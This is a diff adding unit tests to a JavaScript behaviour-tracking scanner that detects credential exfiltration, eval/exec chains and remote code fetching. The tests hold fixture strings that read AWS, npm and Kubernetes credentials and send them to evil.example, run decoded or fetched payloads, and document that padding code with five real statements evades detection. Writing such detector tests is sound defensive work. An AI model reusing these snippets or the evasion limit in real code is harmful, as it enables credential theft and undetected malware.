@@ -192,4 +192,82 @@ test('reset() clears accumulated violations and signals', (bt) => {
   assert.strictEqual(bt.moduleSignals.size, 0);
 });
 
+// ─── F-73: position source == match source (sanitized signals) ────────────────
+// A signal whose boolean flag is derived from the sanitized scanSrc must take its proximity
+// POSITIONS from scanSrc too, not raw content. Repro of the reopened comment-FP class: a REAL
+// .aws/credentials read sits many separators from a fetch (uncorrelated), while a COMMENT merely
+// MENTIONING .aws/credentials sits right next to that fetch. The comment is blanked in scanSrc so
+// the boolean correctly ignores it -- but pre-F-73 the comment's raw-content position still landed
+// next to the fetch and manufactured a CRITICAL. With positions sourced from scanSrc, the comment
+// contributes no position, so only the (far) real read counts and the module stays clean.
+test('F-73: comment-mentioned credential path near egress does NOT manufacture CRITICAL', (bt) => {
+  const src =
+    `const creds = fs.readFileSync('/root/.aws/credentials');\n` +   // real read (boolean true), far below
+    `a1=1; a2=1; a3=1; a4=1; a5=1; a6=1;\n` +                        // 6 real statements => read is >5 separators from fetch
+    `// harmless mention of /root/.aws/credentials in a comment\n` + // comment mention adjacent to the fetch
+    `fetch('http://evil.example/?d='+creds);`;
+  const v = bt.analyzeModule('f73.js', src);
+  assert.ok(!v.some((x) => x.rule === 'CREDENTIAL_EXFILTRATION' && x.severity === 'CRITICAL'),
+    'comment mention adjacent to egress must not fire CRITICAL when the real read is far away');
+});
+
+test('F-73: genuine close-proximity credential exfil still fires CRITICAL', (bt) => {
+  const v = bt.analyzeModule('f73tp.js', `const creds = fs.readFileSync('/root/.aws/credentials'); fetch('http://evil.example/?d='+creds);`);
+  assert.ok(ruleOf(v, 'CREDENTIAL_EXFILTRATION'), 'a genuine adjacent credential exfil must still block');
+});
+
+// ─── F-69: padding-adversary coverage for every contextual detector ───────────
+// The structural (separator-distance) correlation is INVARIANT to comment/whitespace padding.
+// Assert every contextual detector stays caught across {0,25,50,100,150,200,500,1000} chars of
+// BOTH comment and whitespace padding inserted between the correlated halves -- the exact attack
+// (F-69) that defeated the old fixed 200-char window at >=200 chars.
+{
+  const PADS = [0, 25, 50, 100, 150, 200, 500, 1000];
+  const commentPad = (n) => (n === 0 ? '' : '\n/*' + 'x'.repeat(Math.max(0, n - 4)) + '*/\n');
+  const wsPad = (n) => (n === 0 ? '' : '\n' + ' '.repeat(n) + '\n');
+  // [expectedRule, frontHalf, backHalf] -- source is front + PAD + back. One entry per contextual
+  // detector that uses withinContext(): the three CREDENTIAL_EXFILTRATION shapes (sensitivePath,
+  // .npmrc+token, .kube/config+host), the exec chain, the decode-then-eval, and remote-fetch-exec.
+  const CONTEXTUAL = [
+    ['CREDENTIAL_EXFILTRATION', `const s = fs.readFileSync('/root/.aws/credentials');`, `fetch('http://evil.example/?d='+s);`],
+    ['CREDENTIAL_EXFILTRATION', `const c = fs.readFileSync(os.homedir()+'/.npmrc','utf8'); const t=c.match(/_authToken=(.+)/)[1];`, `fetch('http://evil.example/c?d='+t);`],
+    ['CREDENTIAL_EXFILTRATION', `const k = fs.readFileSync(os.homedir()+'/.kube/config','utf8');`, `https.request({host:'evil.example',path:'/?d='+k});`],
+    ['DYNAMIC_CODE_EXEC_CHAIN', `const g = eval(payload);`, `require('child_process').execSync(g);`],
+    ['OBFUSCATED_CODE_EXECUTION', `const p = Buffer.from(blob,'base64').toString();`, `eval(p);`],
+    ['REMOTE_FETCH_EXEC', `const r = fetch('http://evil.example/stage2');`, `new Function(r)();`],
+  ];
+  for (const [rule, front, back] of CONTEXTUAL) {
+    for (const kind of ['comment', 'whitespace']) {
+      const padFn = kind === 'comment' ? commentPad : wsPad;
+      test(`F-69 padding-adversary: ${rule} survives ${kind} padding {0..1000}`, (bt) => {
+        for (const n of PADS) {
+          bt.reset();
+          const v = bt.analyzeModule('pad.js', front + padFn(n) + back);
+          assert.ok(
+            v.some((x) => x.rule === rule && (x.severity === 'CRITICAL' || x.severity === 'HIGH')),
+            `${rule} must stay caught with ${n} chars of ${kind} padding (structural correlation is padding-immune)`
+          );
+        }
+      });
+    }
+  }
+
+  // Honest evasion limit (documented, not hidden): comment/whitespace never adds separators, so
+  // the ONLY way to push two correlated signals apart is real intervening code. With
+  // CORRELATION_MAX_SEPARATORS=5, the credential-read statement's own ';' plus N real statements is
+  // 1+N separators, so detection holds through 4 statements (5 separators) and falls off at 5 (6).
+  test('F-69 evasion limit: caught through 4 real intervening statements, falls off at 5+', (bt) => {
+    const front = `const s = fs.readFileSync('/root/.aws/credentials');`;
+    const back = `fetch('http://evil.example/?d='+s);`;
+    const stmts = (n) => (n === 0 ? '' : ' ' + Array.from({ length: n }, (_, i) => `x${i}=1;`).join(' ') + ' ');
+    const caughtAt = (n) => {
+      bt.reset();
+      const v = bt.analyzeModule('e.js', front + stmts(n) + back);
+      return v.some((x) => x.rule === 'CREDENTIAL_EXFILTRATION' && x.severity === 'CRITICAL');
+    };
+    for (const n of [0, 1, 2, 3, 4]) assert.ok(caughtAt(n), `must be caught through ${n} real intervening statements`);
+    for (const n of [5, 6, 8]) assert.ok(!caughtAt(n), `must fall off at ${n} real intervening statements (documented structural limit)`);
+  });
+}
+
 console.log(`\nAll behavior-tracker unit tests passed (${passed}).`);
